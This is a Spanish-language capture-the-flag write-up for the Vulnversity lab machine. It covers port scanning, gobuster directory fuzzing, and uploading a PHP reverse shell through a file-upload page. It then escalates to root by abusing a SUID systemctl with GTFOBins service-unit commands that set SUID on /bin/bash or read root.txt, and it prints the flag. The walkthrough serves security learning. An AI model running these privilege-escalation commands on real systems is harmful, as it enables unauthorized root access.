PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes

La web está en el puerto 3333.

Fuzzing web:
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.203.140:3333/
http://10.10.203.140:3333/internal/

Es una ruta donde podemos subir archivos. Subimos la reverse shell en php de Pentestmonkey.

Fuzzing para encontrar la ruta donde se almacenan los archivos:

gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.203.140:3333/internal/

Los archivos se almecenan en esta ruta -> http://10.10.203.140:3333/internal/uploads

Nos ponemos en escucha y ejecutamos la reverse shell para ganar acceso al servidor web.

Hacemos el tratamiento de la tty y buscamos la user flag.

www-data@vulnuniversity: find / -name user.txt 2>/dev/null
/home/bill/user.txt

## Escalada de privilegios

Buscamos permisos SUID
find / -perm -4000 2>/dev/null

Encontramos /bin/systemctl
Buscamos en gtfobins y modificamos ciertas partes.

Archivo original gtfobins:

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```



-Explicación: ExecStart=/bin/sh -c "id > /tmp/output"
Permite ejecutar comandos como root y guarda el resultado a la ruta /tmp/output. Aquí podemos ejecutar cualquier comando como root, ya que el archivo tiene permisos SUID.

-Explotación de binario:
El archivo que se crea en todas las opciones tiene que ser creado en la ruta /tmp,  que es el único sitio donde tenemos permisos de escritura.

3 formas diferentes:

1-Otorgar permisos SUID a la /bin/bash:

-Creamos un archivo en /tmp, pegamos el código de gtfobins con las siguientes modificaciones:
	1-Quitamos './' antes de systemctl
	2-Otorgamos permisos SUID con chmod +s al binario /bin/bash, que es el intérprete de comandos de linux. 
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF

-Otorgamos permisos a nuestro archivo y lo ejecutamos : 
chmod 777 escalada.sh
./escalada.sh

-Miramos los permisos de /bin/bash y vemos que ahora tenemos permisos SUID (lo indica la 's').
ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash

-Iniciamos una nueva sesión de bash en modo privilegiado, al ejecutar el siguiente comando bash mantiene el UID efectivo elevado, debido a los permisos SUID y el modo privilegiado, lo que resulta en una sesión de shell con privilegios de **root**:
	www-data@vulnuniversity:/tmp$ bash -p
	bash-4.3# whoami
	root


2-Mandarnos una reverse shell a nuestra máquina:

NO ME SALEEEE

3-Listar directamente el root.txt:

-Creamos un archivo en /tmp, pegamos el código de gtfobins con las siguientes modificaciones:
	1-Quitamos './' antes de systemctl
	2-Hacemos un cat del archivo root.txt

	TF=$(mktemp).service
	echo '[Service]
	Type=oneshot
	ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
	[Install]
	WantedBy=multi-user.target' > $TF
	systemctl link $TF
	systemctl enable --now $TF


-Otorgamos permisos a nuestro archivo y lo ejecutamos : 
chmod 777 escalada.sh
./escalada.sh

cat output: a58ff8579f0a9270368d33a9966c7fd5

